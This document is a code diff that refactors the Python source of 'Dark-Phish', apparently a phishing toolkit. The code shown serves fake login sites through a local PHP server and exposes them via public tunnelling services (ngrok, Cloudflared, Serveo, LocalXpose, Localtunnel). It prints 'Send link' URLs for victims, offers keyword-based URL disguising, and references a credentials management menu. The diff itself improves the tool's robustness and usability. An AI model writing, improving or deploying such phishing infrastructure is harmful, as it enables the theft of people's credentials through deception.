@@ -26,7 +26,6 @@ host    = "0.0.0.0"
 port    = 8080
 
 def logo():
-    os.system("clear")
     print("""\033[1;91m
           __                 _____ _____     _     _
        __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
@@ -43,9 +42,9 @@ def check_update():
         version_url = "https://raw.githubusercontent.com/Cyber-Anonymous/Dark-Phish/main/version.txt"
     
         r = requests.get(version_url)
-        status = r.status_code     
+        status = r.status_code
         if (status == 200):
-            gh_version = float(r.text)  
+            gh_version = float(r.text)
             if (gh_version > version):
                 print("\n\033[1;92mA new update (Version {}) is available for Dark-Phish.\033[0;0m\n".format(gh_version))
             else:
@@ -150,7 +149,7 @@ Credentials Management Menu:
 
     while True:
         try:
-            option = input("\nOPTION: ")
+            option = input("\ndark-phish > ")
             option = int(option)
             break
         except:
@@ -399,7 +398,7 @@ print("""
 
 while True:
     try:
-        option=input("\nOPTION: ").lower()
+        option=input("\ndark-phish > ").lower()
         if option == "custom":
             break
         else:
@@ -426,7 +425,7 @@ print("""
 Tunnels = 6
 while True:
     try:
-        tunnel = input("OPTION: ")
+        tunnel = input("dark-phish > ")
         tunnel = int(tunnel)
         if (tunnel > Tunnels):
             print("\033[1;91m[!] Invalid option!\033[0;0m\n")
@@ -610,11 +609,11 @@ def server(action):
     if (tunnel == 1):
         print("\n\033[1;92mStarting PHP server...\033[0;0m")
         
-        os.system("""
+        os.system(r"""
         php -S {}:{} > tunnel.txt 2>&1 & sleep 5
         """.format(host, port))
 
-        os.system("""
+        os.system(r"""
         grep -o "http://[-0-9A-Za-z.:]*" "tunnel.txt" -oh > link.txt
         """)
 
@@ -624,23 +623,23 @@ def server(action):
         print("\033[1;92mStarting NGROK server...\033[0;0m")
         start_ngrok_server() 
         os.chdir("sites/{}".format(action))
-        os.system("""
+        os.system(r"""
     curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9A-Za-z]*\.ngrok-free.app" -oh > link.txt
     """)
 
-    elif (tunnel == 3):
+    elif tunnel == 3:
         php_server()
         
         print("\033[1;92mStarting Cloudflared tunnel...\033[0;0m")
         os.system("""./cloudflared --url {}:{} > tunnel.txt 2>&1 &
-sleep 12""".format(host, port))
+    sleep 12""".format(host, port))
 
         shutil.move("tunnel.txt", "sites/{}".format(action)) 
         os.chdir("sites/{}".format(action))
         
-        os.system("""grep -o "https://[-0-9A-Za-z]*\.trycloudflare.com" "tunnel.txt" -oh > link.txt""")
+        os.system(r"""grep -o "https://[-0-9A-Za-z]*\.trycloudflare.com" "tunnel.txt" -oh > link.txt""")
 
-    elif (tunnel == 4):
+    elif tunnel == 4:
         php_server()
         
         print("\033[1;92mStarting LocalXpose tunnel...\033[0;0m")
@@ -650,97 +649,83 @@ sleep 12""".format(host, port))
         sleep 10
         """.format(host, port))
             try:
-                temp_file = open("tunnel.txt", 'r')
-                temp_data = temp_file.read()
-                temp_file.close()
-                if ("unauthenticated access" in temp_data):
+                with open("tunnel.txt", 'r') as temp_file:
+                    temp_data = temp_file.read()
+                if "unauthenticated access" in temp_data:
                     os.system("rm -rf tunnel.txt")
                     os.system("./loclx account status")
                     os.system("./loclx account login")
                 else:
                     break
             except Exception as error:
-                    print(error)
-                    sys.exit()
+                print(error)
+                sys.exit()
                 
-        shutil.move("tunnel.txt","sites/{}".format(action))
+        shutil.move("tunnel.txt", "sites/{}".format(action))
         os.chdir("sites/{}".format(action))
-        os.system("""
-        grep -o "[-0-9A-Za-z]*\.loclx.io" "tunnel.txt" -oh > link.txt""")
-        temp = open("link.txt","r")
-        link = temp.read()
-        temp.close()
-        file = open("link.txt","w")
-        file.write("https://"+link)
-        file.close()
+        os.system(r"""grep -o "[-0-9A-Za-z]*\.loclx.io" "tunnel.txt" -oh > link.txt""")
+        try:
+            with open("link.txt", "r") as temp:
+                link = temp.read()
+            with open("link.txt", "w") as file:
+                file.write("https://" + link)
+        except Exception as e:
+            print(f"Error handling link file: {e}")
 
-    elif(tunnel == 5):
+    elif tunnel == 5:
         php_server()
         
         print("\033[1;92mStarting Serveo tunnel...\033[0;0m")
         os.system("""ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:{}:{} serveo.net > tunnel.txt 2>&1 & sleep 10""".format(host, port))
-        shutil.move("tunnel.txt","sites/{}".format(action))
+        shutil.move("tunnel.txt", "sites/{}".format(action))
         os.chdir("sites/{}".format(action))
-        os.system("""
-        grep -o "https://[-0-9a-z]*\.serveo.net" "tunnel.txt" -oh > link.txt
-        """)
+        os.system(r"""grep -o "https://[-0-9a-z]*\.serveo.net" "tunnel.txt" -oh > link.txt""")
 
-    elif(tunnel == 6):
+    elif tunnel == 6:
         php_server()
         
         print("\033[1;92mStarting Localtunnel...\033[0;0m")
         os.system("""lt --port {} > tunnel.txt 2>&1 & sleep 10""".format(port))
         shutil.move("tunnel.txt", "sites/{}".format(action))
         os.chdir("sites/{}".format(action))
-        os.system("""
-            grep -o "https://[-0-9a-z]*\.loca.lt" "tunnel.txt" -oh > link.txt
-            """)
+        os.system(r"""grep -o "https://[-0-9a-z]*\.loca.lt" "tunnel.txt" -oh > link.txt""")
 
     else:
         print("\033[1;91m[!] Invalid option!\033[0;0m\n")
-        
-    file = open("link.txt","r")
-    link=file.read()
-    file.close()
-    
-    if (len(link) > 0):
+
+    # Read the generated link
+    link = ""
+    try:
+        with open("link.txt", "r") as file:
+            link = file.read().strip()
+    except FileNotFoundError:
+        pass
+
+    if len(link) > 0:
         try:
-            condition = input("\nModify the URL (Y/N): ").lower()
+            condition = input("\nModify the URL (Y/N): ").lower().strip()
             print("")
-        except:
-            pass
+        except (EOFError, KeyboardInterrupt):
+            condition = None
     else:
         condition = None
-    print("\033[1;92mSend link:\033[0;0m",link)
 
-    if (condition == "y" or condition == "yes"):
-        keyword = keywords[action]
-        modified= modify_url(keyword, link)
-        if (modified[0] != None):
-            print("\033[1;92mSend link:\033[0;0m", modified[0])
-        else:
+    print("\033[1;92mSend link:\033[0;0m", link)
+
+    if condition in ("y", "yes"):
+        keyword = keywords.get(action, "")
+        modified = modify_url(keyword, link)
+        for i, mod_link in enumerate(modified):
+            if mod_link is not None:
+                print("\033[1;92mSend link {}:\033[0;0m {}".format(i+1, mod_link))
+
+    # Cleanup
+    for filename in ["link.txt", "tunnel.txt"]:
+        try:
+            os.remove(filename)
+        except FileNotFoundError:
             pass
-        if (modified[1] != None):
-            print("\033[1;92mSend link:\033[0;0m", modified[1])
-        else:
-            pass
-        if (modified[2] != None):
-            print("\033[1;92mSend link:\033[0;0m", modified[2])
-        else:
-            pass
-        if (modified[3] != None):
-            print("\033[1;92mSend link:\033[0;0m", modified[3])
-        else:
-            pass
-    else:
-        pass
-    
-    
-    os.remove("link.txt")
-    try:
-        os.remove("tunnel.txt")
-    except:
-        pass
+
     return None
 
 def stop():
